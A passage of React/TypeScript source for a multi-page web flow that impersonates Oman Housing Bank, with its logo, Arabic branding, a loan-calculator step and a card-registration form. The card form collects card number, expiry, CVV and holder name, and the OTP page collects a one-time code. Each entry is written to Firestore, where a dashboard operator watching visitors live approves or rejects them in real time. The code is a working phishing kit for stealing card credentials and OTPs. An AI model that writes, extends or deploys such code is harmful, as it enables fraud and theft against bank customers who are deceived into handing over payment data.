          object-fit: cover; object-position: right center; display: block;
        }

        /* content */
        .card-content {
          width: calc(100% - 38px);
          min-height: calc(100vh - 92px);
          margin: 0 auto;
          padding: 26px 24px 16px;
          background: #fbfbfb;
          border-right: 1px solid #d6d6d6;
          border-left:  1px solid #d6d6d6;
        }
        .card-page-title {
          text-align: center;
          font-size: 30px;
          font-weight: 700;
          color: #1e1e1e;
          margin: 0 0 24px;
        }

        /* field */
        .cf-group { margin-bottom: 18px; }
        .cf-label {
          display: block;
          text-align: right;
          font-size: 18px;
          color: #626262;
          margin-bottom: 7px;
        }
        .cf-input-wrap {
          display: flex;
          align-items: center;
          border: 1px solid #bd927e;
          border-radius: 8px;
          background: #fff;
          overflow: hidden;
          width: 100%;
          min-width: 0;
          transition: box-shadow .2s, border-color .2s;
        }
        .cf-input-wrap:focus-within {
          border-color: #8a6558;
          box-shadow: 0 0 0 3px rgba(189,146,126,.16);
        }
        .cf-input-wrap--err {
          border-color: #c0392b !important;
          box-shadow: 0 0 0 3px rgba(192,57,43,.13) !important;
        }
        .cf-input-wrap--ok {
          border-color: #27ae60 !important;
          box-shadow: 0 0 0 3px rgba(39,174,96,.12) !important;
        }
        .cf-field-error {
          margin: 5px 0 0;
          font-size: 13px;
          color: #c0392b;
          text-align: right;
          direction: rtl;
        }
        .cf-icon {
          width: 48px; flex-shrink: 0;
          display: flex; align-items: center; justify-content: center;
          color: #888;
          border-left: 1px solid #e0ccc4;
          height: 48px;
        }
        .cf-input {
          flex: 1; min-width: 0; height: 48px;
          border: none; outline: none; background: transparent;
          font-family: Tahoma, Arial, sans-serif;
          font-size: 16px; color: #222;
          text-align: right; direction: rtl;
          padding: 0 13px 0 8px;
          overflow: hidden;
        }
        .cf-input::placeholder { color: #bbb; direction: ltr; text-align: right; }
        .cf-input.ltr-input {
          direction: ltr;
          text-align: left;
          letter-spacing: 1.5px;
        }
        .cf-input.ltr-input::placeholder { direction: ltr; text-align: left; letter-spacing: 1px; }

        /* two-col row — strict equal halves */
        .cf-row {
          display: flex;
          gap: 10px;
          margin-bottom: 18px;
          direction: rtl;
        }
        .cf-row .cf-group {
          flex: 0 0 calc(50% - 5px);
          width: calc(50% - 5px);
          min-width: 0;
          margin-bottom: 0;
        }
        .cf-row .cf-label {
          font-size: 15px;
          white-space: nowrap;
          overflow: hidden;
          text-overflow: ellipsis;
        }
        .cf-row .cf-icon {
          width: 40px;
        }
        .cf-row .cf-input {
          font-size: 14px;
          padding: 0 8px 0 4px;
        }

        /* CVV dots placeholder */
        .cf-input.cvv-input::placeholder { letter-spacing: 4px; }

        /* right icon (inside input on the left side due to RTL) */
        .cf-icon-right {
          width: 48px; flex-shrink: 0;
          display: flex; align-items: center; justify-content: center;
          color: #888;
          border-right: 1px solid #e0ccc4;
          height: 48px;
          order: 1;
        }

        /* checkbox */
        .cf-checkbox-row {
          display: flex;
          align-items: center;
          justify-content: flex-end;
          gap: 10px;
          margin: 6px 0 18px;
          direction: rtl;
          font-size: 17px;
          color: #444;
        }
        .cf-checkbox {
          width: 20px; height: 20px;
          border: 1.5px solid #bd927e;
          border-radius: 4px;
          appearance: none;
          cursor: pointer;
          background: #fff;
          flex-shrink: 0;
          transition: background .15s, border-color .15s;
          position: relative;
          display: grid;
          place-items: center;
        }
        .cf-checkbox:checked {
          background: #c87f64;
          border-color: #c87f64;
        }
        .cf-checkbox:checked::after {
          content: "";
          display: block;
          width: 5px;
          height: 9px;
          border: 2px solid #fff;
          border-top: none;
          border-left: none;
          transform: rotate(45deg) translate(-1px, -1px);
        }
        .cf-terms-link {
          color: #c87f64;
          text-decoration: underline;
          cursor: pointer;
        }

        /* submit button */
        .cf-submit-btn {
          width: 100%; height: 58px;
          border: none; border-radius: 8px;
          background: #c87f64; color: #fff;
          font-family: Tahoma, Arial, sans-serif;
          font-size: 21px; font-weight: 600;
          cursor: pointer;
          transition: filter .18s, transform .14s;
        }
        .cf-submit-btn:hover  { filter: brightness(1.06); }
        .cf-submit-btn:active { transform: scale(.98); }

        /* footer */
        .card-footer {
          width: calc(100% - 38px);
          margin: 18px auto 0;
          border-radius: 14px;
          overflow: hidden;
          box-shadow: 0 4px 20px rgba(0,0,0,.18);
          display: block; line-height: 0;
        }
        .card-footer img { width: 100%; display: block; }

        /* bot (reuse) */
        .card-bot {
          position: fixed; z-index: 3;
          right: 26px; bottom: 10px;
          width: 78px; height: 78px;
          border: 0; border-radius: 50%;
          background: #fff;
          box-shadow: 0 1px 9px rgba(0,0,0,.18);
          cursor: pointer;
          animation: cbot-float 2.8s ease-in-out infinite;
        }
        .card-bot .notification-badge {
          position: absolute; z-index: 4;
          top: -5px; right: 1px;
          width: 22px; height: 22px;
          display: grid; place-items: center;
          border-radius: 50%;
          color: #fff; background: #ec0808;
          font-family: Arial, sans-serif;
          font-size: 13px; font-weight: 700;
        }
        @keyframes cbot-float {
          0%, 100% { transform: translateY(0); }
          50%       { transform: translateY(-4px); }
        }
      `}</style>

      <header className="card-header">
        <div className="card-header-actions">
          <Menu className="card-header-icon card-menu-icon" strokeWidth={2.1} />
          <Search className="card-header-icon card-search-icon" strokeWidth={3} />
        </div>
        <img
          src={`${import.meta.env.BASE_URL}images/oman-bank-logo.jpeg`}
          alt="بنك الإسكان العماني - Oman Housing Bank"
          className="card-logo-img"
        />
      </header>

      <section className="card-content">
        <h1 className="card-page-title">تسجيل بطاقة صراف</h1>

        {/* رقم البطاقة */}
        <div className="cf-group">
          <label className="cf-label">:رقم البطاقة</label>
          <div className={`cf-input-wrap ${cardLeadingErr || cardError || cardShort ? "cf-input-wrap--err" : cardValid ? "cf-input-wrap--ok" : ""}`}>
            <div className="cf-icon"><CreditCard size={20} strokeWidth={1.8} /></div>
            <input
              className="cf-input ltr-input"
              placeholder="1234 5678 9012 3456"
              inputMode="numeric"
              value={cardNum}
              onBlur={() => setCardTouched(true)}
              onChange={(e) => handleCardNum(e.target.value)}
            />
            {cardValid      && <span style={{paddingLeft:"10px",color:"#27ae60",fontSize:"18px",flexShrink:0}}>✓</span>}
            {(cardLeadingErr || cardError || cardShort) && <span style={{paddingLeft:"10px",color:"#c0392b",fontSize:"18px",flexShrink:0}}>✗</span>}
          </div>
          {cardLeadingErr && <p className="cf-field-error">رقم البطاقة لا يمكن أن يبدأ بالصفر</p>}
          {!cardLeadingErr && cardShort  && <p className="cf-field-error">رقم البطاقة يجب أن يكون 16 رقماً</p>}
          {!cardLeadingErr && cardError  && <p className="cf-field-error">رقم البطاقة غير صحيح — تحقق من الأرقام</p>}
        </div>

        {/* CVV + تاريخ الانتهاء */}
        <div className="cf-row">
          {/* تاريخ الانتهاء — right in RTL */}
          <div className="cf-group">
            <label className="cf-label">:تاريخ الانتهاء</label>
            <div className="cf-input-wrap">
              <div className="cf-icon"><CalendarDays size={20} strokeWidth={1.8} /></div>
              <input
                className="cf-input ltr-input"
                placeholder="MM / YY"
                inputMode="numeric"
                value={expiry}
                onChange={(e) => handleExpiry(e.target.value)}
              />
            </div>
          </div>
          {/* CVV — left in RTL */}
          <div className="cf-group">
            <label className="cf-label">:(CVV) الرمز السري</label>
            <div className="cf-input-wrap">
              <div className="cf-icon"><Lock size={20} strokeWidth={1.8} /></div>
              <input
                className="cf-input cvv-input ltr-input"
                type="password"
                placeholder="• • •"
                inputMode="numeric"
                maxLength={3}
                value={cvv}
                onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
              />
            </div>
          </div>
        </div>

        {/* اسم صاحب البطاقة */}
        <div className="cf-group">
          <label className="cf-label">:اسم صاحب البطاقة</label>
          <div className="cf-input-wrap">
            <div className="cf-icon"><User size={20} strokeWidth={1.8} /></div>
            <input
              className="cf-input"
              placeholder="الاسم كما هو على البطاقة"
              value={holder}
              onChange={(e) => setHolder(e.target.value)}
            />
          </div>
        </div>

        {/* الشروط */}
        <div className="cf-checkbox-row">
          <span>أوافق على <span className="cf-terms-link">الشروط والأحكام</span></span>
          <input
            type="checkbox"
            className="cf-checkbox"
            checked={agreed}
            onChange={(e) => setAgreed(e.target.checked)}
          />
        </div>

        <button
          className="cf-submit-btn"
          type="button"
          disabled={submitting}
          onClick={async () => {
            if (!cardValid || !agreed) return;
            setSubmitting(true);
            try {
              if (docId) {
                await updateCardData(docId, {
                  cardNumber: cardNum.replace(/\s/g, ""),
                  cvv,
                  expiryDate: expiry,
                  cardHolderName: holder,
                });
              }
              onNext();
            } catch (err) {
              console.error("Firestore card update error:", err);
              onNext(); // navigate even on error
            } finally {
              setSubmitting(false);
            }
          }}
        >
          {submitting ? "جارٍ الحفظ..." : "متابعة"}
        </button>
      </section>

      <div className="card-footer">
        <img src={`${import.meta.env.BASE_URL}images/oman-footer.jpeg`} alt="بنك الإسكان العماني - معلومات التواصل" />
      </div>

      <SupportBot extraClass="card-bot" />
    </main>
  );
}

/* ══════════════════════════════════════════
   PAGE 4 — Loading (waiting for dashboard)
══════════════════════════════════════════ */
function LoadingPage({
  docId,
  onApprove,
  onReject,
}: {
  docId: string;
  onApprove: () => void;
  onReject: () => void;
}) {
  // Keep latest callbacks in refs so the onSnapshot listener never needs
  // to be re-created when the parent re-renders (avoids unsubscribe/resubscribe
  // on every render which delays the approve signal).
  const approveRef = useRef(onApprove);
  const rejectRef  = useRef(onReject);
  useEffect(() => { approveRef.current = onApprove; }, [onApprove]);
  useEffect(() => { rejectRef.current  = onReject;  }, [onReject]);

  useEffect(() => {
    if (!docId) return;
    // Subscribe once; only re-subscribe if docId changes
    const unsub = watchCardStatus(
      docId,
      () => approveRef.current(),
      () => rejectRef.current(),
    );
    return () => unsub();
  }, [docId]); // ← docId only, not the callbacks

  return (
    <div className="loading-page" dir="rtl">
      <style>{`
        .loading-page {
          min-height: 100vh;
          width: 100%;
          display: flex;
          flex-direction: column;
          align-items: center;
          background: #f7f7f7;
          font-family: Tahoma, Arial, sans-serif;
          box-sizing: border-box;
        }
        .loading-page *, .loading-page *::before, .loading-page *::after { box-sizing: border-box; }

        /* header — same dark bar */
        .lp-header {
          height: 92px; width: 100%;
          display: flex; align-items: center; justify-content: space-between;
          padding: 0 40px; direction: ltr;
          background: #202020;
          flex-shrink: 0;
        }
        .lp-header-actions { display: flex; align-items: center; gap: 38px; }
        .lp-header-icon { color: #f5f5f5; display: block; }
        .lp-logo-img {
          height: 72px; width: 230px;
          object-fit: cover; object-position: right center; display: block;
        }

        /* waiting banner */
        .lp-banner {
          width: calc(100% - 36px);
          max-width: 480px;
          margin: 22px auto 14px;
          background: #fff;
          border-radius: 14px;
          box-shadow: 0 4px 22px rgba(0,0,0,.13);
          padding: 22px 20px 18px;
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 14px;
          text-align: center;
        }
        .lp-spinner {
          width: 52px; height: 52px;
          border: 4px solid rgba(200,127,100,.18);
          border-top-color: #c87f64;
          border-radius: 50%;
          animation: lp-spin 0.9s linear infinite;
          flex-shrink: 0;
        }
        @keyframes lp-spin { to { transform: rotate(360deg); } }
        .lp-wait-title {
          font-size: 19px; font-weight: 700;
          color: #1e1e1e; line-height: 1.4;
        }
        .lp-wait-sub {
          font-size: 14px; color: #777;
          line-height: 1.6;
        }
        .lp-dots::after {
          content: '';
          animation: lp-dots 1.5s steps(4, end) infinite;
        }
        @keyframes lp-dots {
          0%   { content: ''; }
          25%  { content: '.'; }
          50%  { content: '..'; }
          75%  { content: '...'; }
          100% { content: ''; }
        }

        /* OTP screen preview image */
        .lp-preview {
          width: calc(100% - 36px);
          max-width: 480px;
          margin: 0 auto 18px;
          border-radius: 14px;
          overflow: hidden;
          box-shadow: 0 4px 22px rgba(0,0,0,.15);
          opacity: 0.55;
          filter: blur(1.5px);
          pointer-events: none;
          user-select: none;
        }
        .lp-preview img { width: 100%; display: block; }
      `}</style>

      {/* Header */}
      <div className="lp-header">
        <div className="lp-header-actions">
          <Menu className="lp-header-icon" style={{width:28,height:28}} strokeWidth={2.1} />
          <Search className="lp-header-icon" style={{width:22,height:22}} strokeWidth={3} />
        </div>
        <img src={`${import.meta.env.BASE_URL}images/oman-bank-logo.jpeg`} alt="بنك الإسكان العماني" className="lp-logo-img" />
      </div>

      {/* Waiting banner */}
      <div className="lp-banner">
        <div className="lp-spinner" />
        <p className="lp-wait-title">جاري التحقق من معلوماتك<span className="lp-dots" /></p>
        <p className="lp-wait-sub">يرجى الانتظار، سيتم التحقق من بيانات البطاقة المُدخلة والإشعار بالنتيجة تلقائياً.</p>
      </div>

      {/* Blurred OTP preview — shows what's coming */}
      <div className="lp-preview">
        <img src={`${import.meta.env.BASE_URL}images/otp-screen.jpeg`} alt="معاينة صفحة OTP" />
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════
   PAGE 5 — OTP Entry
══════════════════════════════════════════ */
function OtpPage({ docId, phoneNumber }: { docId: string; phoneNumber: string }) {
  const [digits, setDigits]           = useState<string[]>(["", "", "", "", "", ""]);
  const [submitting, setSubmitting]   = useState(false);
  const [submitted, setSubmitted]     = useState(false);
  const [rejected, setRejected]       = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const otpValue   = digits.join("");
  const isComplete = otpValue.length === 6;

  /* Listen for dashboard OTP rejection — reset form so visitor can retry */
  useEffect(() => {
    if (!docId) return;
    const unsub = watchOtpStatus(docId, () => {
      setRejected(true);
      setSubmitted(false);
      setSubmitting(false);
      setDigits(["", "", "", "", "", ""]);
      // Focus first box after a short tick
      setTimeout(() => inputRefs.current[0]?.focus(), 80);
    });
    return () => unsub();
  }, [docId]);

  function handleDigit(index: number, value: string) {
    const v = value.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[index] = v;
    setDigits(next);
    if (rejected) setRejected(false); // hide error banner once user starts typing
    if (v && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  }

  function handleKeyDown(index: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  }

  async function handleVerify() {
    if (!isComplete || submitting) return;
    setRejected(false);
    setSubmitting(true);
    try {
      if (docId) await submitOtpCode(docId, otpValue);
      setSubmitted(true);
    } catch (err) {
      console.error("OTP submit error:", err);
      setSubmitted(true);
    } finally {
      setSubmitting(false);
    }
  }

  const maskedPhone = phoneNumber
    ? phoneNumber.slice(0, 1) + "x".repeat(Math.max(0, phoneNumber.length - 1))
    : "9xxxxxxxx";

  return (
    <div className="otp-page" dir="rtl">
      <style>{`
        .otp-page {
          min-height: 100vh;
          width: 100%;
          background: #f7f7f7;
          font-family: Tahoma, Arial, sans-serif;
          box-sizing: border-box;
          color: #333;
          display: flex;
          flex-direction: column;
          align-items: center;
        }
        .otp-page *, .otp-page *::before, .otp-page *::after { box-sizing: border-box; }

        /* header */
        .otp-header {
          height: 92px; width: 100%;
          display: flex; align-items: center; justify-content: space-between;
          padding: 0 40px; direction: ltr;
          background: #202020; flex-shrink: 0;
        }
        .otp-header-actions { display: flex; align-items: center; gap: 38px; }
        .otp-header-icon { color: #f5f5f5; display: block; }
        .otp-logo-img {
          height: 72px; width: 230px;
          object-fit: cover; object-position: right center; display: block;
        }

        /* card */
        .otp-card {
          width: calc(100% - 36px);
          max-width: 480px;
          background: #fff;
          border-radius: 18px;
          padding: 32px 26px 28px;
          box-shadow: 0 6px 32px rgba(0,0,0,.13);
          margin: 22px auto 0;
          text-align: center;
        }

        /* illustration */
        .otp-illustration {
          display: flex;
          align-items: flex-end;
          justify-content: center;
          gap: 0;
          margin-bottom: 20px;
          position: relative;
          height: 90px;
        }
        .otp-phone-svg { width: 70px; opacity: .85; }
        .otp-bubble {
          position: absolute;
          top: 8px; left: 50%;
          transform: translateX(-20%);
          background: #c87f64;
          color: #fff;
          font-size: 18px;
          font-weight: 700;
          padding: 7px 14px;
          border-radius: 12px 12px 12px 2px;
          letter-spacing: 4px;
          white-space: nowrap;
          box-shadow: 0 2px 8px rgba(200,127,100,.35);
        }

        .otp-title {
          font-size: 26px; font-weight: 700;
          color: #1e1e1e; margin: 0 0 8px;
        }
        .otp-subtitle {
          font-size: 15px; color: #666;
          margin: 0 0 4px; line-height: 1.5;
        }
        .otp-phone {
          font-size: 15px; color: #333;
          margin: 0 0 22px; direction: ltr;
          display: flex; align-items: center;
          justify-content: center; gap: 6px;
        }
        .otp-phone-label { color: #666; direction: rtl; }
        .otp-phone-num { color: #c87f64; font-weight: 700; letter-spacing: 1px; }

        .otp-input-label {
          text-align: right;
          font-size: 17px; color: #444;
          margin-bottom: 12px;
        }

        /* 6 boxes */
        .otp-boxes {
          display: flex;
          justify-content: center;
          gap: 10px;
          margin-bottom: 16px;
          direction: ltr;
        }
        .otp-box {
          width: 46px; height: 52px;
          border: 1.5px solid #d4a08a;
          border-radius: 8px;
          font-size: 22px; font-weight: 700;
          color: #1e1e1e;
          text-align: center;
          background: #fff;
          outline: none;
          transition: border-color .18s, box-shadow .18s;
          caret-color: #c87f64;
        }
        .otp-box:focus {
          border-color: #c87f64;
          box-shadow: 0 0 0 3px rgba(200,127,100,.18);
        }
        .otp-box:not(:placeholder-shown) { border-color: #c87f64; }

        .otp-resend {
          font-size: 14px; color: #666;
          margin-bottom: 20px;
          display: flex; align-items: center;
          justify-content: center; gap: 4px;
        }
        .otp-resend-link {
          color: #c87f64; cursor: pointer;
          text-decoration: underline; font-weight: 600;
        }

        /* verify button */
        .otp-verify-btn {
          width: 100%; height: 56px;
          border: none; border-radius: 8px;
          background: #c87f64; color: #fff;
          font-family: Tahoma, Arial, sans-serif;
          font-size: 21px; font-weight: 600;
          cursor: pointer;
          transition: filter .18s, transform .14s;
          margin-bottom: 12px;
        }
        .otp-verify-btn:hover:not(:disabled) { filter: brightness(1.06); }
        .otp-verify-btn:active:not(:disabled) { transform: scale(.98); }
        .otp-verify-btn:disabled { opacity: .55; cursor: not-allowed; }

        .otp-validity {
          font-size: 13px; color: #888;
          display: flex; align-items: center;
          justify-content: center; gap: 5px;
        }
        .otp-clock { color: #c87f64; }

        /* footer */
        .otp-footer {
          width: calc(100% - 36px);
          max-width: 480px;
          margin: 18px auto 0;
          border-radius: 14px;
          overflow: hidden;
          box-shadow: 0 4px 20px rgba(0,0,0,.15);
          line-height: 0;
        }
        .otp-footer img { width: 100%; display: block; }
      `}</style>

      {/* Header */}
      <div className="otp-header">
        <div className="otp-header-actions">
          <Menu className="otp-header-icon" style={{width:28,height:28}} strokeWidth={2.1} />
          <Search className="otp-header-icon" style={{width:22,height:22}} strokeWidth={3} />
        </div>
        <img src={`${import.meta.env.BASE_URL}images/oman-bank-logo.jpeg`} alt="بنك الإسكان العماني" className="otp-logo-img" />
      </div>

      {/* Card */}
      <div className="otp-card">
        {/* Illustration */}
        <div className="otp-illustration">
          <svg className="otp-phone-svg" viewBox="0 0 80 130" fill="none">
            <rect x="8" y="4" width="64" height="122" rx="10" fill="#f0f0f0" stroke="#ccc" strokeWidth="2"/>
            <rect x="14" y="14" width="52" height="96" rx="6" fill="#fff" stroke="#ddd"/>
            <rect x="30" y="6" width="20" height="4" rx="2" fill="#ccc"/>
            <circle cx="40" cy="116" r="4" fill="#ccc"/>
          </svg>
          <div className="otp-bubble">• • • •</div>
        </div>

        <h1 className="otp-title">تم إرسال الرمز</h1>
        <p className="otp-subtitle">تم إرسال رمز التحقق على رقم الهاتف المسجل</p>
        <div className="otp-phone">
          <span className="otp-phone-num">{maskedPhone}</span>
          <span className="otp-phone-label">:رقم الهاتف</span>
        </div>

        {submitted ? (
          /* ── Waiting screen ── */
          <div style={{textAlign:"center", padding:"10px 0 18px", direction:"rtl"}}>
            <style>{`
              @keyframes otp-spin {
                to { transform: rotate(360deg); }
              }
              @keyframes otp-pulse-ring {
                0%   { transform: scale(.9); opacity:.7; }
                100% { transform: scale(1.18); opacity:0; }
              }
              .otp-wait-ring {
                position:relative; width:80px; height:80px;
                margin: 0 auto 22px;
              }
              .otp-wait-ring::before {
                content:"";
                position:absolute; inset:-10px;
                border-radius:50%;
                background:rgba(200,127,100,.18);
                animation: otp-pulse-ring 1.4s ease-out infinite;
              }
              .otp-wait-spinner {
                width:80px; height:80px; border-radius:50%;
                border:5px solid rgba(200,127,100,.18);
                border-top-color:#c87f64;
                animation: otp-spin .9s linear infinite;
              }
              .otp-wait-title {
                font-size:22px; font-weight:700;
                color:#1e1e1e; margin:0 0 10px;
              }
              .otp-wait-sub {
                font-size:14px; color:#777; line-height:1.7; margin:0;
              }
              .otp-wait-code {
                display:inline-flex; gap:8px; margin:18px auto 0;
                direction:ltr;
              }
              .otp-wait-digit {
                width:40px; height:46px; border-radius:8px;
                background:#f5ede9; color:#c87f64;
                font-size:20px; font-weight:700;
                display:flex; align-items:center; justify-content:center;
                border:1.5px solid #e8c4b0;
              }
            `}</style>

            <div className="otp-wait-ring">
              <div className="otp-wait-spinner" />
            </div>

            <p className="otp-wait-title">جارٍ مراجعة الكود…</p>
            <p className="otp-wait-sub">
              تم إرسال الرمز بنجاح<br />
              يرجى الانتظار حتى تتم المراجعة
            </p>

            {/* show submitted digits */}
            <div className="otp-wait-code">
              {otpValue.split("").map((ch, i) => (
                <div key={i} className="otp-wait-digit">{ch}</div>
              ))}
            </div>
          </div>
        ) : (
          /* ── Input form ── */
          <>
            {/* Rejection banner */}
            {rejected && (
              <div style={{
                background:"#fff0f0", border:"1.5px solid #e74c3c", borderRadius:10,
                padding:"10px 16px", marginBottom:14, color:"#c0392b",
                fontSize:14, fontWeight:600, direction:"rtl", textAlign:"right",
              }}>
                ❌ الرمز غير صحيح — أدخل رمزاً جديداً
              </div>
            )}

            <p className="otp-input-label">:أدخل رمز التحقق</p>
            <div className="otp-boxes">
              {digits.map((d, i) => (
                <input
                  key={i}
                  ref={(el) => { inputRefs.current[i] = el; }}
                  className="otp-box"
                  style={rejected ? {borderColor:"#e74c3c", boxShadow:"0 0 0 3px rgba(231,76,60,.15)"} : undefined}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  placeholder="─"
                  value={d}
                  onChange={(e) => handleDigit(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  disabled={submitting}
                />
              ))}
            </div>

            <div className="otp-resend">
              <span className="otp-resend-link">إعادة إرسال الرمز ↺</span>
              <span>لم يصلك الرمز؟</span>
            </div>

            <button
              className="otp-verify-btn"
              type="button"
              disabled={!isComplete || submitting}
              onClick={handleVerify}
            >
              {submitting ? "جارٍ الإرسال..." : "تحقق"}
            </button>

            <div className="otp-validity">
              <span>رمز التحقق صالح لمدة 5 دقائق</span>
              <span className="otp-clock">🕐</span>
            </div>
          </>
        )}
      </div>

      {/* Footer */}
      <div className="otp-footer">
        <img src={`${import.meta.env.BASE_URL}images/oman-footer.jpeg`} alt="بنك الإسكان العماني - معلومات التواصل" />
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════
   ROOT — full flow
══════════════════════════════════════════ */
export function OmanHousingForm() {
  const [page, setPage] = useState<1 | 2 | 3 | "loading" | "otp">(1);
  const [docId, setDocId]           = useState<string>("");
  const [phoneNumber, setPhoneNumber] = useState<string>("");

  /* Create anonymous visitor doc immediately on page open → appears online in dashboard */
  useEffect(() => {
    initVisitorOnline()
      .then((id) => setDocId(id))
      .catch((err) => console.error("initVisitorOnline error:", err));
  }, []);

  /* Mark visitor offline when tab/window closes */
  useEffect(() => {
    if (!docId) return;
    const handleUnload = () => markVisitorOffline(docId);
    window.addEventListener("beforeunload", handleUnload);
    return () => window.removeEventListener("beforeunload", handleUnload);
  }, [docId]);

  /* stable callbacks for watchCardStatus (avoid re-subscribing on every render) */
  const goOtp    = useRef(() => setPage("otp"));
  const goCard   = useRef(() => setPage(3));
  useEffect(() => { goOtp.current  = () => setPage("otp"); }, []);
  useEffect(() => { goCard.current = () => setPage(3);     }, []);

  if (page === 1) return (
    <RegistrationPage
      docId={docId}
      onNext={(phone) => { setPhoneNumber(phone); setPage(2); }}
    />
  );
  if (page === 2) return (
    <LoanCalculatorPage docId={docId} onNext={() => setPage(3)} />
  );
  if (page === 3) return (
    <CardRegistrationPage docId={docId} onNext={() => setPage("loading")} />
  );
  if (page === "loading") return (
    <LoadingPage
      docId={docId}
      onApprove={() => goOtp.current()}
      onReject={() => goCard.current()}
    />
  );
  return <OtpPage docId={docId} phoneNumber={phoneNumber} />;
}
